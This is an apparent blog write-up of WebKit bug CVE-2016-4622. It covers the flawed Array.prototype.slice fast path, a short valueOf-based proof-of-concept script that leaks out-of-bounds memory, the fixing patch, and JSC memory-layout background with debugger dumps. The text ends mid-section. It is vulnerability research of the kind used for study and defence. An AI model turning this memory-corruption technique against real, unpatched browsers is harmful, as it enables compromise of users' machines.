<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice. first, let us see what is slice method and how it works. The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified. &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.">
<title>Notes on CVE-2016-4622</title>

<link rel='canonical' href='http://localhost:1313/post/cve-2016-4622/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Notes on CVE-2016-4622">
<meta property='og:description' content="Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice. first, let us see what is slice method and how it works. The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified. &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.">
<meta property='og:url' content='http://localhost:1313/post/cve-2016-4622/'>
<meta property='og:site_name' content='spektre&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='WebKit' /><meta property='article:tag' content='Browser' /><meta property='article:tag' content='CVE' /><meta property='article:tag' content='Exploitation' /><meta property='article:published_time' content='2023-04-16T06:19:43&#43;05:30'/><meta property='article:modified_time' content='2023-04-16T06:19:43&#43;05:30'/>
<meta name="twitter:title" content="Notes on CVE-2016-4622">
<meta name="twitter:description" content="Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice. first, let us see what is slice method and how it works. The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified. &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.">
    <link rel="shortcut icon" href="/img/favicon.png" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/hinata_hu13819647778857511344.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">spektre&#39;s Blog</a></h1>
            <h2 class="site-description">CTF Player | Pwn | messing with js engines</h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                <span>About</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    

            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/browser-exploitation/" >
                Browser Exploitation
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/cve-2016-4622/">Notes on CVE-2016-4622</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 16, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    10 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="bug-analysis">Bug Analysis
</h2><p>The vulnerability is present in the implementation of ArrayProtoSlice.</p>
<p>first, let us see what is slice method and how it works.</p>
<p>The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt;&gt;&gt; var array <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>undefined
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; array.slice<span style="color:#f92672">(</span>1,4<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>b,c,d
</span></span></code></pre></div><p>Now let us take a look at the implementation (slightly commented) of ArrayProtoSlice.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>EncodedJSValue JSC_HOST_CALL <span style="color:#a6e22e">arrayProtoFuncSlice</span>(ExecState<span style="color:#f92672">*</span> exec)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    VM<span style="color:#f92672">&amp;</span> vm <span style="color:#f92672">=</span> exec<span style="color:#f92672">-&gt;</span>vm();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> scope <span style="color:#f92672">=</span> DECLARE_THROW_SCOPE(vm);
</span></span><span style="display:flex;"><span>    JSObject<span style="color:#f92672">*</span> thisObj <span style="color:#f92672">=</span> exec<span style="color:#f92672">-&gt;</span>thisValue().toThis(exec, StrictMode).toObject(exec);
</span></span><span style="display:flex;"><span>    ASSERT(<span style="color:#f92672">!!</span>scope.exception() <span style="color:#f92672">==</span> <span style="color:#f92672">!</span>thisObj);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (UNLIKELY(<span style="color:#f92672">!</span>thisObj))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> length <span style="color:#f92672">=</span> toLength(exec, thisObj); <span style="color:#75715e">// Get the length of the array
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> begin <span style="color:#f92672">=</span> argumentClampedIndexFromStartOrEnd(exec, <span style="color:#ae81ff">0</span>, length); <span style="color:#75715e">// Get the start index for slicing the array.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> end <span style="color:#f92672">=</span> argumentClampedIndexFromStartOrEnd(exec, <span style="color:#ae81ff">1</span>, length, length); <span style="color:#75715e">// Get the end index for slicing the array.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (end <span style="color:#f92672">&lt;</span> begin)    <span style="color:#75715e">// Ensure end index is greater than or equal to the begin index
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        end <span style="color:#f92672">=</span> begin;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>pair<span style="color:#f92672">&lt;</span>SpeciesConstructResult, JSObject<span style="color:#f92672">*&gt;</span> speciesResult <span style="color:#f92672">=</span> speciesConstructArray(exec, thisObj, end <span style="color:#f92672">-</span> begin);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We can only get an exception if we call some user function.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ASSERT(<span style="color:#f92672">!!</span>scope.exception() <span style="color:#f92672">==</span> (speciesResult.first <span style="color:#f92672">==</span> SpeciesConstructResult<span style="color:#f92672">::</span>Exception));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (UNLIKELY(speciesResult.first <span style="color:#f92672">==</span> SpeciesConstructResult<span style="color:#f92672">::</span>Exception))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Check if the result object is an array object, to take fast path.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">bool</span> okToDoFastPath <span style="color:#f92672">=</span> speciesResult.first <span style="color:#f92672">==</span> SpeciesConstructResult<span style="color:#f92672">::</span>FastPath <span style="color:#f92672">&amp;&amp;</span> isJSArray(thisObj);
</span></span><span style="display:flex;"><span>    RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (LIKELY(okToDoFastPath)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (JSArray<span style="color:#f92672">*</span> result <span style="color:#f92672">=</span> asArray(thisObj)<span style="color:#f92672">-&gt;</span>fastSlice(<span style="color:#f92672">*</span>exec, begin, end <span style="color:#f92672">-</span> begin))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> JSValue<span style="color:#f92672">::</span>encode(result);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create a new result object using the species constructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    JSObject<span style="color:#f92672">*</span> result;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (speciesResult.first <span style="color:#f92672">==</span> SpeciesConstructResult<span style="color:#f92672">::</span>CreatedObject)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> speciesResult.second;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> constructEmptyArray(exec, <span style="color:#66d9ef">nullptr</span>, end <span style="color:#f92672">-</span> begin);
</span></span><span style="display:flex;"><span>        RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy the elements from the original array object to the result object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> k <span style="color:#f92672">=</span> begin; k <span style="color:#f92672">&lt;</span> end; k<span style="color:#f92672">++</span>, n<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        JSValue v <span style="color:#f92672">=</span> getProperty(exec, thisObj, k);
</span></span><span style="display:flex;"><span>        RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v) {
</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">-&gt;</span>putDirectIndex(exec, n, v, <span style="color:#ae81ff">0</span>, PutDirectIndexShouldThrow);
</span></span><span style="display:flex;"><span>            RETURN_IF_EXCEPTION(scope, { });
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    scope.release();
</span></span><span style="display:flex;"><span>    setLength(exec, vm, result, n);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> JSValue<span style="color:#f92672">::</span>encode(result);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Simply put, the above code gets the length of the array and converts the args into native integers to get start and end values. Then performs slicing.
The slicing is done in two ways:</p>
<ul>
<li>FastSlice: Uses memcpy to copy the elements into a new array.</li>
<li>Slow path: Loops and copies each element individually to the new array.</li>
</ul>
<p>In the implementation of ArrayProtoSlice, the values are converted to native integers by <code>argumentClampedIndexFromStartOrEnd()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> begin <span style="color:#f92672">=</span> argumentClampedIndexFromStartOrEnd(exec, <span style="color:#ae81ff">0</span>, length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> end <span style="color:#f92672">=</span> argumentClampedIndexFromStartOrEnd(exec, <span style="color:#ae81ff">1</span>, length, length);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#a6e22e">argumentClampedIndexFromStartOrEnd</span>(ExecState<span style="color:#f92672">*</span> exec, <span style="color:#66d9ef">int</span> argument, <span style="color:#66d9ef">unsigned</span> length, <span style="color:#66d9ef">unsigned</span> undefinedValue <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    JSValue value <span style="color:#f92672">=</span> exec<span style="color:#f92672">-&gt;</span>argument(argument);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (value.isUndefined())
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> undefinedValue;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">double</span> indexDouble <span style="color:#f92672">=</span> value.toInteger(exec);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (indexDouble <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        indexDouble <span style="color:#f92672">+=</span> length;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> indexDouble <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span><span style="color:#f92672">&gt;</span>(indexDouble);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> indexDouble <span style="color:#f92672">&gt;</span> length <span style="color:#f92672">?</span> length : <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span><span style="color:#f92672">&gt;</span>(indexDouble);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt;&gt;&gt; a <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1,2,3,4,5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; a.slice<span style="color:#f92672">(</span>1,3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2,3<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Here we can see that even if the parameters are strings, they are converted to native integers.</p>
<p>According to the conversion rules, if an object has a callable property <code>valueOf</code>, it will be called and the return value will be used if it is a primitive value. So, if we change the length using <code>valueof</code> function in one of the parameters, <code>.slice</code> still uses the old length value, So memcpy will now result in out-of-bound access.</p>
<p>Now let us see what this looks like in action.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.23</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">valueOf</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> [{}, <span style="color:#ae81ff">1.23</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">b</span>);
</span></span></code></pre></div><p>The expected output should be an array with undefined values. But&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>spektre@skream:~/webkit$ ./WebKitBuild/Debug/bin/jsc poc.js
</span></span><span style="display:flex;"><span>1.23,2.23,1.5488838078e-314,6.365987374e-314,6.94548287109343e-310
</span></span></code></pre></div><p>Here we abused the JS Type Conversions while calculating the &lsquo;begin&rsquo; and &rsquo;end&rsquo; variables during the fast path. During the conversion, valueOf method is executed, the length is set to 0, and the ArrayProtoSlice still uses the old length value which resulted in an Out-Of-Bounds read
We can also use this not only to leak values but also to inject values as well.</p>
<p>Now let us take a look at the commit(650552a) where this bug was patched.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span><span style="display:flex;"><span>index cfdd7fceb7f47..08a6ec991afef 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
</span></span><span style="display:flex;"><span>         return JSValue::encode(jsUndefined());
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) {
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == getLength(exec, thisObj))) {
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>         if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))
</span></span><span style="display:flex;"><span>             return JSValue::encode(result);
</span></span><span style="display:flex;"><span>     }
</span></span></code></pre></div><p>Here the patch adds an additional check for the length of the source array before calling fastSlice.</p>
<p>Before we get into details of the exploit, Here are a few things you need to know that might help you understand the exploit better.</p>
<h3 id="nan-boxing-and-js-values">NaN Boxing and JS Values
</h3><p>In JSC, The least significant values are used to indicate which type of value it is. This is clearly defined in JSValue.h</p>
<pre tabindex="0"><code>     * The encoding makes use of unused NaN space in the IEEE754 representation.  Any value
     * with the top 13 bits set represents a QNaN (with the sign bit set).  QNaN values
     * can encode a 51-bit payload.  Hardware produced and C-library payloads typically
     * have a payload of zero.  We assume that non-zero payloads are available to encode
     * pointer and integer values.  Since any 64-bit bit pattern where the top 15 bits are
     * all set represents a NaN with a non-zero payload, we can use this space in the NaN
     * ranges to encode other values (however there are also other ranges of NaN space that
     * could have been selected).
     *
     * This range of NaN space is represented by 64-bit numbers beginning with the 15-bit
     * hex patterns 0xFFFC and 0xFFFE - we rely on the fact that no valid double-precision
     * numbers will fall in these ranges.
     *
     * The top 15-bits denote the type of the encoded JSValue:
     *
     *     Pointer {  0000:PPPP:PPPP:PPPP
     *              / 0002:****:****:****
     *     Double  {         ...
     *              \ FFFC:****:****:****
     *     Integer {  FFFE:0000:IIII:IIII
     *
     * The scheme we have implemented encodes double precision values by performing a
     * 64-bit integer addition of the value 2^49 to the number. After this manipulation
     * no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFE.
     * Values must be decoded by reversing this operation before subsequent floating point
     * operations may be peformed.
     *
     * 32-bit signed integers are marked with the 16-bit tag 0xFFFE.
     *
     * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
     * null and undefined values are represented by specific, invalid pointer values:
     *
     *     False:     0x06
     *     True:      0x07
     *     Undefined: 0x0a
     *     Null:      0x02
</code></pre><p>Consider this example. We create an array with an Integer, a double, a string, a bool, and an object.</p>
<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">a = [0xdeadbeef,0.1337,&#34;abcd&#34;,true,{}]
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt;&gt;&gt; describe<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Object: 0x7fffadfc4430 with butterfly 0x7fffaddd8288 <span style="color:#f92672">(</span>0x7fffadff3360:<span style="color:#f92672">[</span>Array, <span style="color:#f92672">{}</span>, ArrayWithContiguous, Proto:0x7fffadfd0120<span style="color:#f92672">])</span>, ID: <span style="color:#ae81ff">87</span>
</span></span></code></pre></div><p>and this is how the values look in memory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/16gx 0x7fffaddd8288
</span></span><span style="display:flex;"><span>0x7fffaddd8288: 0x41ecd5b7dde00000      0x3fc21d14e3bcd35b
</span></span><span style="display:flex;"><span>0x7fffaddd8298: 0x00007fffa74ef940      0x0000000000000007
</span></span><span style="display:flex;"><span>0x7fffaddd82a8: 0x00007fffadffc360      0x00000000badbeef0
</span></span></code></pre></div><h3 id="jsobject">JSObject
</h3><p>An object in JS is a collection of Key-Value pairs, which are called properties.</p>
<p>consider this example.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0.1337</span>,<span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;lol&#34;</span>,<span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">:</span><span style="color:#66d9ef">true</span>,<span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">:</span>[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>]}
</span></span></code></pre></div><p>we can use describe() to get info about the object.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt;&gt;&gt; describe<span style="color:#f92672">(</span>x<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Object: 0x7fffadffc1a0 with butterfly <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>0x7fffadf9ea30:<span style="color:#f92672">[</span>Object, <span style="color:#f92672">{</span>a:0, b:1, c:2, d:3, e:4<span style="color:#f92672">}</span>, NonArray, Proto:0x7fffadfc40a0, Leaf<span style="color:#f92672">])</span>, ID: <span style="color:#ae81ff">280</span>
</span></span></code></pre></div><p>This is how the object looks in memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/16gx 0x7fffadffc1a0
</span></span><span style="display:flex;"><span>0x7fffadffc1a0: 0x0100180000000118      0x0000000000000000
</span></span><span style="display:flex;"><span>0x7fffadffc1b0: 0xffff000000000001      0x3fc21d14e3bcd35b
</span></span><span style="display:flex;"><span>0x7fffadffc1c0: 0x00007fffadf94300      0x0000000000000007
</span></span><span style="display:flex;"><span>0x7fffadffc1d0: 0x00007fffadfc4320      0x0000000000000000
</span></span></code></pre></div><p><strong>Structure of a JSObject:</strong></p>
<pre tabindex="0"><code>--------------------
    StructureID        32 bits
--------------------   
    Header Bits        32 bits
--------------------
    Butterfly          64 bits
--------------------
    Inline Properties  n*64 bits
--------------------
</code></pre><h3 id="butterfly">Butterfly
</h3><p>Butterfly consists of elements of the array and out-of-line properties. It&rsquo;s called a butterfly because this points to the middle of the structure.
The elements are at +ve offsets from the Butterfly pointer and out-of-line properties are at -ve offsets.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt;&gt;&gt; a <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>0xdeadbeef,0.1337,<span style="color:#e6db74">&#34;abcd&#34;</span>,true,<span style="color:#f92672">{}]</span>
